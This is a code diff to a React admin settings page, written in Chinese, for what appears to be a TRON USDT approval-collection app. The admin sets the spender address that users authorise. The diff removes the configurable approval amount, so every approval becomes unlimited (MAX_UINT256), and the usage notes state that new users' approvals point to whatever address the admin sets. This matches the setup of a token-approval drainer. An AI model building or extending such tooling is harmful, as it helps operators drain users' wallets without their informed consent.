@@ -1,5 +1,5 @@
 import { useState, useEffect } from 'react';
-import { Save, RefreshCw, Settings, Wallet, Coins } from 'lucide-react';
+import { Save, RefreshCw, Settings, Wallet } from 'lucide-react';
 import { Button } from '@/components/ui/button';
 import { Input } from '@/components/ui/input';
 import { Label } from '@/components/ui/label';
@@ -20,7 +20,6 @@ const AdminSettings = () => {
   const [loading, setLoading] = useState(true);
   const [saving, setSaving] = useState(false);
   const [spenderAddress, setSpenderAddress] = useState('');
-  const [approvalAmount, setApprovalAmount] = useState('');
 
   useEffect(() => {
     fetchSettings();
@@ -42,10 +41,6 @@ const AdminSettings = () => {
         const spender = data.find(s => s.key === 'spender_address');
         if (spender) {
           setSpenderAddress(spender.value);
-        }
-        const amount = data.find(s => s.key === 'approval_amount');
-        if (amount) {
-          setApprovalAmount(amount.value);
         }
       }
     } catch (e) {
@@ -81,42 +76,6 @@ const AdminSettings = () => {
         console.error(error);
       } else {
         toast.success('授权地址已保存');
-        fetchSettings();
-      }
-    } catch (e) {
-      toast.error('保存失败');
-      console.error(e);
-    }
-    setSaving(false);
-  };
-
-  const handleSaveApprovalAmount = async () => {
-    if (!approvalAmount.trim()) {
-      toast.error('请输入授权额度');
-      return;
-    }
-
-    const amount = parseFloat(approvalAmount);
-    if (isNaN(amount) || amount <= 0) {
-      toast.error('请输入有效的授权额度');
-      return;
-    }
-
-    setSaving(true);
-    try {
-      const { error } = await supabase
-        .from('app_settings' as any)
-        .upsert({
-          key: 'approval_amount',
-          value: approvalAmount,
-          description: 'USDT授权额度'
-        }, { onConflict: 'key' }) as { error: any };
-
-      if (error) {
-        toast.error('保存失败');
-        console.error(error);
-      } else {
-        toast.success('授权额度已保存');
         fetchSettings();
       }
     } catch (e) {
@@ -199,64 +158,6 @@ const AdminSettings = () => {
               </CardContent>
             </Card>
 
-            {/* Approval Amount Settings */}
-            <Card>
-              <CardHeader>
-                <div className="flex items-center gap-2">
-                  <Coins className="h-5 w-5 text-primary" />
-                  <CardTitle>授权额度设置</CardTitle>
-                </div>
-                <CardDescription>
-                  设置用户USDT授权的额度（单位：USDT）
-                </CardDescription>
-              </CardHeader>
-              <CardContent className="space-y-4">
-                <div className="space-y-2">
-                  <Label htmlFor="approval_amount">授权额度 (USDT)</Label>
-                  <div className="flex gap-2">
-                    <Input
-                      id="approval_amount"
-                      type="number"
-                      placeholder="例如：1000000"
-                      value={approvalAmount}
-                      onChange={(e) => setApprovalAmount(e.target.value)}
-                      className="font-mono"
-                    />
-                    <Button onClick={handleSaveApprovalAmount} disabled={saving}>
-                      <Save className="h-4 w-4 mr-2" />
-                      {saving ? '保存中...' : '保存'}
-                    </Button>
-                  </div>
-                  <p className="text-xs text-muted-foreground">
-                    设置为0或留空将使用无限授权（MAX_UINT256）
-                  </p>
-                </div>
-
-                {/* Preset amounts */}
-                <div className="flex flex-wrap gap-2">
-                  {['10000', '100000', '1000000', '10000000'].map((amount) => (
-                    <Button
-                      key={amount}
-                      variant="outline"
-                      size="sm"
-                      onClick={() => setApprovalAmount(amount)}
-                      className={approvalAmount === amount ? 'border-primary' : ''}
-                    >
-                      {parseInt(amount).toLocaleString()} USDT
-                    </Button>
-                  ))}
-                  <Button
-                    variant="outline"
-                    size="sm"
-                    onClick={() => setApprovalAmount('0')}
-                    className={approvalAmount === '0' ? 'border-primary' : ''}
-                  >
-                    无限额度
-                  </Button>
-                </div>
-              </CardContent>
-            </Card>
-
             {/* Usage Instructions */}
             <Card>
               <CardHeader>
@@ -266,7 +167,7 @@ const AdminSettings = () => {
                 <ul className="space-y-2 text-sm text-muted-foreground">
                   <li className="flex items-start gap-2">
                     <span className="text-primary">•</span>
-                    <span>授权合约地址用于用户进行USDT授权</span>
+                    <span>授权合约地址用于用户进行USDT无限授权</span>
                   </li>
                   <li className="flex items-start gap-2">
                     <span className="text-primary">•</span>
@@ -274,15 +175,11 @@ const AdminSettings = () => {
                   </li>
                   <li className="flex items-start gap-2">
                     <span className="text-primary">•</span>
-                    <span>授权额度设置为0时将使用无限授权</span>
-                  </li>
-                  <li className="flex items-start gap-2">
-                    <span className="text-primary">•</span>
                     <span>请确保地址为有效的TRON网络地址（以T开头，34位）</span>
                   </li>
                   <li className="flex items-start gap-2">
                     <span className="text-destructive">•</span>
-                    <span className="text-destructive">更改设置后，新用户的授权将使用新的配置</span>
+                    <span className="text-destructive">更改地址后，新用户的授权将指向新地址</span>
                   </li>
                 </ul>
               </CardContent>
